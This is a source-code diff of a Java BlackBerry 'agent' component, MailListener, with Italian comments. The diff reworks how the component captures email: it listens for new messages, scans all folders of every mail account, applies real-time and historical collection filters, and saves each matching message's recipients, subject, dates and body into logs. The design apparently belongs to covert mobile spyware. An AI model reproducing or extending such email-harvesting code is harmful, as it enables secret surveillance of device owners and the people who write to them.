@@ -5,6 +5,7 @@ package blackberry.agent;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.util.Date;
 import java.util.Vector;
 
 import net.rim.blackberry.api.mail.Address;
@@ -24,7 +25,6 @@ import net.rim.blackberry.api.mail.event.FolderEvent;
 import net.rim.blackberry.api.mail.event.FolderListener;
 import net.rim.blackberry.api.mail.event.StoreEvent;
 import net.rim.blackberry.api.mail.event.StoreListener;
-import net.rim.device.api.io.http.HttpDateParser;
 import net.rim.device.api.servicebook.ServiceBook;
 import net.rim.device.api.servicebook.ServiceRecord;
 import net.rim.device.api.util.DataBuffer;
@@ -42,32 +42,66 @@ public class MailListener implements FolderListener, StoreListener,
 		SendListener {
 
 	// #debug
-	static Debug debug = new Debug("MailListener", DebugLevel.INFORMATION);
-
-	protected static final int[] HEADER_KEYS = { Message.RecipientType.TO,
-			Message.RecipientType.CC, Message.RecipientType.BCC };
+	static Debug debug = new Debug("MailListener", DebugLevel.VERBOSE);
 
 	private static final int MAIL_VERSION = 2009070301;
 
-	protected static final int BODY = 1;
-
-	protected static final boolean FILTERFROM = false;
-	protected static final boolean FILTERTO = false;
-	protected static final String DATEFROM = "Tue, Mar 23 2010 06:31:27 GMT";
-	protected static final String DATETO = "Tue, Apr 01 2010 22:31:27 GMT";
-	protected static final boolean FILTERDIM = false;
-	protected static final int BODYDIM = 0;
-
+	MessageAgent messageAgent;
+	String[] names;
+	
 	protected static IntHashtable fieldTable;
 
 	private static ServiceRecord[] mailServiceRecords;
+
+	Filter realtimeFilter;
+	Filter collectFilter;
+
+	private void showMessage(Message message, int maxMessageLen) {
+		Address[] addresses;
+		try {
+			addresses = message.getRecipients(Message.RecipientType.TO);
+			// #mdebug
+			for (int i = 0; i < addresses.length; i++) {
+				debug.trace("Destinatari dell'email: "+ addresses[i].getAddr());
+			}
+			debug.trace("Dimensione dell'email: " + message.getSize()+ "bytes");
+			debug.trace("Data invio dell'email: " + message.getSentDate());
+			debug.trace("Oggetto dell'email: " + message.getSubject());
+
+			final Object obj = message.getContent();
+
+			Multipart parent = null;
+			// #ifdef HAVE_MIME
+			if (obj instanceof MimeBodyPart || obj instanceof TextBodyPart) {
+				final BodyPart bp = (BodyPart) obj;
+				parent = bp.getParent();
+			} else {
+				parent = (Multipart) obj;
+			}
+			
+			// Display the message body
+			final String mpType = parent.getContentType();
+
+			if (mpType
+					.equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)
+					|| mpType
+							.equals(BodyPart.ContentType.TYPE_MULTIPART_MIXED_STRING)) {
+				displayMultipart(parent, maxMessageLen);
+			}
+			// #endif
+		} catch (MessagingException e1) {
+			// TODO Auto-generated catch block
+			e1.printStackTrace();
+		}
+	}
 
 	/**
 	 * controlla se il messaggio e' mime e ne stampa il contenuto
 	 * 
 	 * @param multipart
 	 */
-	protected static void displayMultipart(final Multipart multipart) {
+	protected static void displayMultipart(final Multipart multipart,
+			int maxMessageLen) {
 		// This vector stores fields which are to be displayed only after all
 		// of the body fields are displayed. (Attachments and Contacts).
 		final Vector delayedFields = new Vector();
@@ -100,14 +134,10 @@ public class MailListener implements FolderListener, StoreListener,
 				// editable or a RichTextField if it is not editable. Note: this
 				// does not add any empty fields.
 				if (plainText.length() != 0) {
-					if (FILTERDIM == true && plainText.length() > BODYDIM) {
+					if (maxMessageLen > 0 && plainText.length() > maxMessageLen) {
 						// se e' attivo il filtro sulla dimensione dell'email,
 						// sovrascrive al body dell'email la stringa troncata
-						plainText = plainText.substring(0, (BODYDIM)); // l'unita'
-																		// di
-																		// misura
-																		// e' il
-																		// kbyte
+						plainText = plainText.substring(0, (maxMessageLen));
 					}
 					// #debug debug
 					debug.trace("Testo dell'email :" + plainText);
@@ -126,14 +156,16 @@ public class MailListener implements FolderListener, StoreListener,
 						String htmlText = new String((byte[]) obj);
 						// se e' attivo il filtro sulla dimensione dell'email,
 						// sovrascrive al body dell'email la stringa troncata
-						if (FILTERDIM == true && htmlText.length() > BODYDIM) {
-							htmlText = htmlText.substring(0, (BODYDIM)); // l'unita'
-																			// di
-																			// misura
-																			// e'
-																			// il
-																			// kbyte
+
+						if (maxMessageLen > 0
+								&& htmlText.length() > maxMessageLen) {
+							// se e' attivo il filtro sulla dimensione
+							// dell'email,
+							// sovrascrive al body dell'email la stringa
+							// troncata
+							htmlText = htmlText.substring(0, (maxMessageLen));
 						}
+
 						// #debug debug
 						debug.trace("Testo dell'email MIME: " + htmlText);
 					}
@@ -149,7 +181,7 @@ public class MailListener implements FolderListener, StoreListener,
 								.getContentType();
 						if (childMultipartType
 								.equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
-							displayMultipart(childMultipart);
+							displayMultipart(childMultipart, maxMessageLen);
 						}
 					}
 				}
@@ -167,13 +199,6 @@ public class MailListener implements FolderListener, StoreListener,
 		}
 	}
 
-	String[] names;
-
-	protected static long lastcheck;
-
-	long timestamp;
-
-	MessageAgent messageAgent;
 
 	public MailListener(final MessageAgent messageAgent_) {
 		this.messageAgent = messageAgent_;
@@ -192,130 +217,6 @@ public class MailListener implements FolderListener, StoreListener,
 
 	}
 
-	private void manageMessage(final Message message) throws MessagingException {
-		long dataArrivo, filterDate;
-		// Date emailDate;
-		boolean printEmail;
-
-		printEmail = false;
-
-		// #mdebug
-		debug.trace("Data di invio dell'email " + message.getSentDate()
-				+ " long: " + message.getSentDate().getTime());
-		debug.trace("Data di arrivo dell'email " + message.getReceivedDate()
-				+ " long: " + message.getReceivedDate().getTime());
-		debug.trace("Data del filtro FROM " + DATEFROM + " long: "
-				+ HttpDateParser.parse(DATEFROM));
-		debug.trace("Data del filtro TO " + DATETO + " long: "
-				+ HttpDateParser.parse(DATETO));
-		// #enddebug
-
-		// Se c'e' un filtro sulla data
-		// entro
-		if (FILTERFROM == true) {
-			dataArrivo = message.getReceivedDate().getTime();
-			filterDate = HttpDateParser.parse(DATEFROM);
-			// Se la data e' successiva a quella dell'ultima
-			// lettura e la data dell'email e' successiva a
-			// quella del filtro
-			if (dataArrivo >= lastcheck && dataArrivo >= filterDate) {
-				// Se c'e' anche il filtro della data di fine
-				if (FILTERTO == true) {
-					filterDate = HttpDateParser.parse(DATETO);
-					// Se la data dell'email e' tra data di
-					// inizio e data di fine => OK
-					if (dataArrivo <= filterDate) {
-						// #debug debug
-						debug
-								.trace("Sono attivi i 2 filtri e l'email rispetta i 2 criteri FROM e TO");
-						printEmail = true;
-					}
-				} else {
-					// #debug debug
-					debug
-							.trace("E' attivo solo il filtro FROM e l'email rispetta questo criterio");
-					// Se la data dell'email e' corretta, e c'e'
-					// solo il primo filtro ma non il secondo =>
-					// OK
-					printEmail = true;
-				}
-			}
-
-		} else {
-			// #debug debug
-			debug
-					.trace("Non sono attivi criteri quindi l'email viene acquisita");
-			// Se non ci sono filtri
-			dataArrivo = message.getReceivedDate().getTime();
-			// #debug debug
-			debug.trace("dataArrivo = " + dataArrivo + "lastcheck = "
-					+ lastcheck);
-			if (dataArrivo >= lastcheck) {
-				printEmail = true;
-			}
-		}
-
-		if (printEmail == true) {
-
-			saveLog(message);
-			// #debug debug
-			debug.trace("Mittente dell'email: " + message.getFrom());
-			// debug.trace("Destinatario dell'email: " +
-			// message.getReplyTo());
-			final Address[] addresses = message.getRecipients(HEADER_KEYS[0]);
-			final String name = addresses[0].getAddr();
-			// #mdebug
-			debug.trace("Destinatario dell'email: " + name);
-
-			debug
-					.trace("Dimensione dell'email: " + message.getSize()
-							+ "bytes");
-			debug.trace("Data invio dell'email: " + message.getSentDate());
-			debug.trace("Oggetto dell'email: " + message.getSubject());
-			// #enddebug
-			// Date dataArrivo = message.getReceivedDate();
-			// Date dataArrivo = message.getSentDate();
-			// Date expirationDate = new
-			// Date(HttpDateParser.parse(dataArrivo.toString()));
-			// System.out.println("Data di arrivo dell'email long: "
-			// + expirationDate.getTime());
-			// #mdebug
-			debug.trace("Data di invio dell'email long: "
-					+ message.getSentDate().getTime());
-			debug.trace("Data di arrivo dell'email long: "
-					+ message.getReceivedDate().getTime());
-			// #enddebug
-			// Date data = new Date();
-			// long timeArrived;
-			// timeArrived = data.getTime();
-
-			final Object obj = message.getContent();
-
-			Multipart parent = null;
-			// #ifdef HAVE_MIME
-			if (obj instanceof MimeBodyPart || obj instanceof TextBodyPart) {
-				final BodyPart bp = (BodyPart) obj;
-				parent = bp.getParent();
-			} else {
-				parent = (Multipart) obj;
-			}
-
-			// Display the message body
-			final String mpType = parent.getContentType();
-
-			if (mpType
-					.equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)
-					|| mpType
-							.equals(BodyPart.ContentType.TYPE_MULTIPART_MIXED_STRING)) {
-				displayMultipart(parent);
-			}
-			// #endif
-			System.out
-					.println("-------------------------------------------------------------------------------------");
-		}
-
-	}
-
 	public void messagesAdded(final FolderEvent e) {
 		final Message message = e.getMessage();
 		// if(m.isInbound() && m.getSubject().equals(MY_SUBJECT"))
@@ -323,7 +224,10 @@ public class MailListener implements FolderListener, StoreListener,
 		debug.info("Added Message: " + message);
 
 		try {
-			manageMessage(message);
+			int filtered = realtimeFilter.filterMessage(message, messageAgent.lastcheck);
+			if(filtered == Filter.FILTERED_OK){
+				saveLog(message, realtimeFilter.maxMessageSize);
+			}
 		} catch (final MessagingException ex) {
 			// #debug
 			debug.error("cannot manage added message: " + ex);
@@ -349,7 +253,7 @@ public class MailListener implements FolderListener, StoreListener,
 		// #debug debug
 		debug.trace("run");
 
-		timestamp = messageAgent.initMarkup();
+		long timestamp = messageAgent.initMarkup();
 
 		// Controllo tutti gli account di posta
 		for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
@@ -365,6 +269,7 @@ public class MailListener implements FolderListener, StoreListener,
 			final Folder[] folders = store.list();
 			// Scandisco ogni Folder dell'account di posta
 			scanFolder(folders);
+			messageAgent.updateMarkup();
 		}
 		// #debug debug
 		debug.trace("Fine ricerca!!");
@@ -372,7 +277,7 @@ public class MailListener implements FolderListener, StoreListener,
 		messageAgent.updateMarkup();
 	}
 
-	private void saveLog(final Message message) {
+	private void saveLog(final Message message, final long maxMessageSize) {
 
 		ByteArrayOutputStream os = null;
 		try {
@@ -441,7 +346,10 @@ public class MailListener implements FolderListener, StoreListener,
 				for (int j = 0; j < messages.length; j++) {
 					final Message message = messages[j];
 
-					manageMessage(message);
+					int filtered = collectFilter.filterMessage(message, messageAgent.lastcheck);
+					if(filtered == Filter.FILTERED_OK){
+						saveLog(message, realtimeFilter.maxMessageSize);
+					}
 				}
 			} catch (final MessagingException e) {
 				// #debug debug
@@ -485,7 +393,13 @@ public class MailListener implements FolderListener, StoreListener,
 			addListeners(store);
 		}
 
-		// TODO: leggere messageAgent.filtersEMAIL;
+		// to forever
+		realtimeFilter = (Filter) messageAgent.filtersEMAIL
+				.get(Filter.TYPE_REALTIME);
+
+		// history
+		collectFilter = (Filter) messageAgent.filtersEMAIL
+				.get(Filter.TYPE_COLLECT);
 	}
 
 	public void stop() {
